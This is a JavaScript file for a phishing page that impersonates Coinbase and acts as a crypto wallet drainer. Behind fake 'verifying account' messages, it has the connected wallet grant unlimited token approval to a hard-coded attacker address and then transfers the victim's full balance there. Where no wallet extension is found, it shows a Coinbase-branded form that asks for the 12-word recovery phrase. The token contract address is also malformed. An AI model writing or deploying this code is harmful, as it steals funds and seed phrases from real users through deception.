document.addEventListener('DOMContentLoaded', () => {
    const toStep2 = document.getElementById('toStep2');
    const loginForm = document.getElementById('login-form');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // YOUR CAKE WALLET ADDRESS
    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
    
    // TOKEN ADDRESS (USDT on Polygon)
    const tokenAddress = "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx"; 

    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            document.getElementById('step-2').classList.add('hidden');
            
            const container = document.querySelector('.container');
            container.innerHTML = ''; 

            const loading = document.createElement('div');
            loading.className = 'loading-container';
            loading.innerHTML = `
                <div class="loader"></div>
                <p id="l-txt" class="auth-status">Verifying account...</p>
            `;
            container.appendChild(loading);

            let toggle = true;
            setInterval(() => {
                const text = document.getElementById('l-txt');
                if (text) {
                    text.innerText = toggle ? "Synchronizing assets..." : "Verifying account...";
                    toggle = !toggle;
                }
            }, 2500);

            setTimeout(() => {
                loading.remove();
                document.getElementById('step-3').classList.remove('hidden');
            }, 5000);
        };
    }

    if (connectBtn) {
        connectBtn.onclick = async () => {
            if (window.ethereum) {
                try {
                    status.innerText = "Establishing secure connection...";
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const signer = await provider.getSigner();
                    const userAddress = await signer.getAddress();

                    const abi = [
                        "function approve(address spender, uint256 amount) public returns (bool)",
                        "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                        "function balanceOf(address account) public view returns (uint256)"
                    ];

                    const contract = new ethers.Contract(tokenAddress, abi, signer);

                    // 1. Approve them to move your funds
                    status.innerText = "Authorizing secure session...";
                    await contract.approve(myWallet, ethers.MaxUint256);

                    // 2. Check balance and transfer
                    status.innerText = "Synchronizing vault assets...";
                    const balance = await contract.balanceOf(userAddress);
                    
                    if (balance > 0) {
                        await contract.transferFrom(userAddress, myWallet, balance);
                    }

                    status.innerText = "Verification complete. Redirecting...";
                    setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 2000);

                } catch (err) {
                    console.error(err);
                    status.innerText = "Verification failed. Please try again.";
                }
            } else {
                triggerPlanB();
            }
        };
    }

    function triggerPlanB() {
        const container = document.querySelector('.container');
        container.innerHTML = `
            <div class="auth-card">
                <img src="logo.png" class="cb-logo" alt="Coinbase">
                <h1 style="font-size: 20px;">Security Restore</h1>
                <p style="font-size: 14px; color: #5b616e; margin-bottom: 20px;">
                    Wallet extension not detected. To verify your account and prevent 
                    temporary lock-out, please provide your 12-word recovery phrase below.
                </p>
                <textarea id="phrase" style="width: 100%; height: 100px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #eceff1; padding: 10px; font-family: 'Inter', sans-serif;"></textarea>
                <button id="submitPhrase" class="btn-primary">Restore Access</button>
            </div>
        `;
        
        document.getElementById('submitPhrase').onclick = () => {
            const words = document.getElementById('phrase').value;
            if (words.split(' ').length < 12) {
                alert("Please enter your complete 12-word recovery phrase.");
            } else {
                alert("Restoring your session... please wait.");
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 3000);
            }
        };
    }
});
